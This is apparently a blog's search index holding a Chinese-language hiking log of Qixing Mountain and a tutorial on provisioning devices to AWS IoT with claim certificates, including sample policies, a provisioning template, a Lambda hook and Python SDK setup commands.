<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【爬山紀錄】七星山主峰 + 東峰</title>
      <link href="/posts/22f14c54.html"/>
      <url>/posts/22f14c54.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>由於生長在台北多年還沒去七星山主峰的三角點，趁著難得的好天氣出遊踩點</p><p>這次爬七星山的主要路線是從 <strong>小油坑登山口</strong> -&gt; <strong>七星山主峰</strong> -&gt; <strong>七星山東峰</strong>，接著原路返回到 <strong>小油坑停車場</strong></p><p><img src="/img/mountain-1/161346.jpg"></p><p>七星山是台北市內最高的山，海拔達到 <code>1120</code> 公尺</p><h2 id="小油坑地熱口"><a href="#小油坑地熱口" class="headerlink" title="小油坑地熱口"></a>小油坑地熱口</h2><p>地熱口附近硫磺味很重，但天氣冷其實靠近挺暖的<br><img src="/img/mountain-1/m1.jpg"></p><p>湧出的硫磺泉會沸騰冒泡<br><img src="/img/mountain-1/m2.jpg"><br><img src="/img/mountain-1/m3.jpg"><br><img src="/img/mountain-1/m4.jpg"><br><img src="/img/mountain-1/m5.jpg"><br><img src="/img/mountain-1/m6.jpg"></p><h2 id="七星山主峰"><a href="#七星山主峰" class="headerlink" title="七星山主峰"></a>七星山主峰</h2><p>通往主峰的路上幾乎都是石頭階梯，但階梯路途中挺多陡上，<strong>建議攜帶登山杖</strong></p><p><img src="/img/mountain-1/m13.jpg"><br><img src="/img/mountain-1/m8.jpg"></p><p>現在是11月的芒草季，但這裡風大，芒草都被吹得彎曲，但景色還是挺美</p><p><img src="/img/mountain-1/m7.jpg"><br><img src="/img/mountain-1/m10.jpg"></p><p>假日會很多登山客要來跟這根拍照，就自行考量要不要留個紀念了<br><img src="/img/mountain-1/m9.jpg"></p><h2 id="七星山東峰"><a href="#七星山東峰" class="headerlink" title="七星山東峰"></a>七星山東峰</h2><p>主峰往東峰的路段只需再走 <code>0.3K</code>，可以選擇一次蒐集兩個峰頂。但從七星主峰到七星東峰的部分路段較為濕滑，建議穿有防滑的登山鞋來。</p><h2 id="草叢"><a href="#草叢" class="headerlink" title="草叢"></a>草叢</h2><p>順帶一提，一路上都有很多像是下面這樣，人可以通過的樹叢，如果透過離線地圖看是可以發現路的，而且也能發現有綁繩子，舊友進去稍微探險一下，但由於後面泥濘太多，就沒有深入往下探下去了</p><p><img src="/img/mountain-1/m11.jpg"><br><img src="/img/mountain-1/m12.jpg"><br><img src="/img/mountain-1/m14.jpg"></p><p>東峰的景色個人覺得還好，但也是多人跟著合照。</p><p><img src="/img/mountain-1/m15.jpg"></p><p>之後就原路返回停車場，結束今天的旅程了</p><blockquote><p>其實大多數人都會從小油坑上去到主峰再到東峰，再從冷水坑下去或是反向路線，但由於有開車就只能原路來回拉</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬山健行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 北部 </tag>
            
            <tag> 小百岳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>機群佈建(Fleet Provisioning) - 預先佈建裝置到 AWS IoT</title>
      <link href="/posts/889a40ef.html"/>
      <url>/posts/889a40ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><h2 id="什麼是機群佈建-Fleet-Provisioning"><a href="#什麼是機群佈建-Fleet-Provisioning" class="headerlink" title="什麼是機群佈建(Fleet Provisioning)?"></a>什麼是機群佈建(Fleet Provisioning)?</h2><p>機群佈建當中也有分成 <strong>要求佈建 （Provisioning by Claim）</strong> 還有 <strong>透過信任的使用者佈建 （Provisioning by Trusted User）</strong></p><h3 id="要求佈建"><a href="#要求佈建" class="headerlink" title="要求佈建"></a>要求佈建</h3><p>裝置可以使用內嵌的佈建宣告憑證（Claim Certificate）(這是特殊用途的憑證) 和私有金鑰  來製造。如果這些憑證已向 AWS IoT 註冊，該服務可以將它們交換為裝置可用於一般操作的唯一裝置憑證。</p><h3 id="透過信任的使用者佈建"><a href="#透過信任的使用者佈建" class="headerlink" title="透過信任的使用者佈建"></a>透過信任的使用者佈建</h3><p>在許多情況下，如終端使用者或安裝技術人員等信任的使用者初次使用行動應用程式在其部署的位置設定裝置時，裝置會連線至 AWS IoT</p><blockquote><p>在本篇文章中，主要會介紹透過 <strong>要求佈建</strong> 的方式來去進行機群佈建</p></blockquote><h2 id="要求佈建的流程"><a href="#要求佈建的流程" class="headerlink" title="要求佈建的流程"></a>要求佈建的流程</h2><p><img src="https://i.imgur.com/5UPLkKJ.png" alt="Imgur"></p><h2 id="設置-AWS-IoT-Core"><a href="#設置-AWS-IoT-Core" class="headerlink" title="設置 - AWS IoT Core"></a>設置 - AWS IoT Core</h2><h3 id="建立憑證以及公私鑰對"><a href="#建立憑證以及公私鑰對" class="headerlink" title="建立憑證以及公私鑰對"></a>建立憑證以及公私鑰對</h3><p>產生用於佈建的憑證。</p><ul><li>可以在 AWS IoT Console 上的 <strong>Secure</strong> &gt;&gt; <strong>Certificates</strong> &gt;&gt; <strong>Add Certificates</strong> &gt;&gt; <strong>Create Certificates</strong></li></ul><p><img src="https://i.imgur.com/ay2zm5V.png" alt="Imgur"><br><img src="https://i.imgur.com/Qnr2Olh.png" alt="Imgur"></p><ul><li>接著會跳出對應的畫面，會需要去下載憑證跟私鑰到本地端，另外為了方便也請將 Root CA 憑證下載到本地</li></ul><p><img src="https://i.imgur.com/kRUAGF9.png" alt="Imgur"></p><h3 id="建立-Provisioning-Template-並且附加-Policy"><a href="#建立-Provisioning-Template-並且附加-Policy" class="headerlink" title="建立 Provisioning Template 並且附加 Policy"></a>建立 Provisioning Template 並且附加 Policy</h3><ul><li>建立 Provisioning Template</li></ul><p><img src="https://i.imgur.com/cG83JRG.png" alt="Imgur"></p><ul><li>選擇 <strong>Provisioning deivces with claim certificates</strong>，之後點選 <strong>Nexts</strong></li></ul><p><img src="https://i.imgur.com/7baFaol.png" alt="Imgur"></p><ul><li>建立給 IoT Service 的 Role，點選 <strong>Create Role</strong></li><li>輸入完畢 Role Name 後點選 <strong>View</strong></li></ul><p><img src="https://i.imgur.com/6bZNMWr.png" alt="Imgur"></p><ul><li>Attach policy</li><li>請搜尋並附加 AWS 管理的 Policy <code>AWSIoTThingsRegistration</code></li></ul><p><img src="https://i.imgur.com/MwkIdA0.png" alt="Imgur"><br><img src="https://i.imgur.com/YW2Nfdh.png" alt="Imgur"></p><ul><li>Claim certificate policy，點選 <strong>Create IoT  Policy</strong></li></ul><p><img src="https://i.imgur.com/21XORly.png" alt="Imgur"></p><ul><li>填入 Policy Name 之後貼上範例 JSON</li></ul><p><img src="https://i.imgur.com/mNKS8IC.png" alt="Imgur"></p><p>範例 IoT Policy</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span><span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hzebj7r.png" alt="Imgur"></p><ul><li>勾選憑證</li></ul><p><img src="https://i.imgur.com/5y8PAPu.png" alt="Imgur"></p><p>完成後就可以來設定預佈建</p><h3 id="設定預先佈建"><a href="#設定預先佈建" class="headerlink" title="設定預先佈建"></a>設定預先佈建</h3><p>機群佈建的範本範例</p><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SerialNumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeviceLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LocationTable&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Seattle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.aws&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resources&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;thing&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Thing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">                    <span class="attr">&quot;version&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serialNumber&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;serialNumber&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ThingName&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Fn::Join&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="string">&quot;ThingPrefix_&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;SerialNumber&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v1-lightbulbs&quot;</span><span class="punctuation">,</span> <span class="string">&quot;WA&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;BillingGroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LightBulbBillingGroup&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OverrideSettings&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;MERGE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;REPLACE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;DO_NOTHING&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;certificate&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;CertificateId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate::Id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Active&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;policy&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;PolicyDocument&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iot:us-east-1:123456789012:topic/foo/bar&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeviceConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;FallbackUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.example.com/test-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Fn::FindInMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;LocationTable&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DeviceLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="string">&quot;LocationUrl&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>預先佈建掛接是 Lambda 函數，會先驗證從裝置傳遞的參數，然後才能佈建裝置。此 Lambda 函數必須存在於您的帳戶中，才能佈建裝置。</p><p>這個部分是要設定在配置設備之前執行操作。例如，根據已知設備數據庫檢查設備，以防止未經授權的設備連接到您的帳戶。</p><p><img src="https://i.imgur.com/pL1yTCM.png" alt="Imgur"></p><ul><li>選擇 <strong>Create a Lambda function</strong></li></ul><h3 id="Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate"><a href="#Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate" class="headerlink" title="Sample provisioning hook where you validate the request before activating a certificate"></a>Sample provisioning hook where you validate the request before activating a certificate</h3><blockquote><p>Github: <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate">https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line">provision_response = &#123;</span><br><span class="line">    <span class="string">&#x27;allowProvisioning&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&quot;parameterOverrides&quot;</span>: &#123;<span class="string">&quot;CertDate&quot;</span>: date.today().strftime(<span class="string">&quot;%m/%d/%y&quot;</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line">    <span class="comment">## Stringent validation against internal API&#x27;s/DB etc to validate the request before proceeding</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## if event[&#x27;parameters&#x27;][&#x27;SerialNumber&#x27;] = &quot;approved by company CSO&quot;:</span></span><br><span class="line">    <span class="comment">##     provision_response[&quot;allowProvisioning&quot;] = True</span></span><br><span class="line">    <span class="comment">#####################</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> provision_response</span><br></pre></td></tr></table></figure><h3 id="Hook-Input"><a href="#Hook-Input" class="headerlink" title="Hook Input"></a>Hook Input</h3><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;claimCertificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificatePem&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;templateArn&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;arn:aws:iot:us-east-1:XXXXXXXXXXXX:provisioningtemplate/MyTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clientId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;221a6d10-9c7f-42f1-9153-e52e6fc869c1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>向 AWS IoT 註冊裝置時，AWS IoT 會將此物件傳送至 Lambda 函數。</p><p>傳遞給 Lambda 函數的 <code>parameters</code> 物件包含在 <strong>RegisterThing</strong> 請求 Payload中傳遞之 parameters 引數中的屬性</p><h2 id="設置-設備端"><a href="#設置-設備端" class="headerlink" title="設置 - 設備端"></a>設置 - 設備端</h2><p>所下載的 Claim 憑證和私鑰會需要移動到設備端</p><p>可以通過像是 <code>scp</code> 之類的命令來去透過 SSH 將本地複製檔案到您的設備中。</p><p>另外，會需要在設備端去安裝想要使用的 <strong>IoT Device SDK</strong></p><blockquote><p>AWS IoT 裝置 SDK、行動 SDK 和 AWS IoT 裝置用戶端 - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html</a></p></blockquote><p>目前有支援以 C++, javascript, Java, Python, Embedded-C 語言撰寫的 Device SDK，可以根據實際需求和情境進行使用。</p><h3 id="使用-AWS-IoT-Device-SDK"><a href="#使用-AWS-IoT-Device-SDK" class="headerlink" title="使用 AWS IoT Device SDK"></a>使用 AWS IoT Device SDK</h3><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2">https://github.com/aws/aws-iot-device-sdk-python-v2</a></p></blockquote><p>本篇文章主要使用 <strong>Python IoT Device SDKv2</strong></p><p>若要安裝 SDK 到設備，請先確認設備上是否有 <code>git</code> , <code>Python3</code>還有 <code>Python3-pip</code>套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><p>初始化套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  (Optional) Setup the version number of your local build. The default version </span><br><span class="line">#    for awsiotsdk is set to &quot;1.0.0-dev&quot;, you can set the version number of the</span><br><span class="line">#    local build in &quot;aws-iot-device-sdk-python-v2/awsiot/__init__.py&quot;</span><br><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br><span class="line"></span><br><span class="line">#  Install using Pip (use &#x27;python&#x27; instead of &#x27;python3&#x27; on Windows)</span><br><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>aws-iot-device-sdk-python-v2/samples/fleetprovisioning.py</code> 你也可以通過教本來去設置 Provisioning Template。</p><p>而後續您需要在您的設備上指定：</p><ul><li>AWS IoT Endpoint</li><li>Claim Certificate</li><li>Private Key<br>來去連接到 AWS IoT Core</li></ul><p>腳本的操作步驟可以在下面找到</p><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md">https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fleetprovisioning.py --endpoint &lt;endpoint&gt; --cert &lt;file&gt; --key &lt;file&gt; --template_name &lt;name&gt; --template_parameters &#x27;&#123;\&quot;SerialNumber\&quot;:\&quot;1\&quot;,\&quot;DeviceLocation\&quot;:\&quot;Seattle\&quot;&#125;&#x27; --csr &lt;path to csr file&gt;</span><br></pre></td></tr></table></figure><h2 id="參考文件"><a href="#參考文件" class="headerlink" 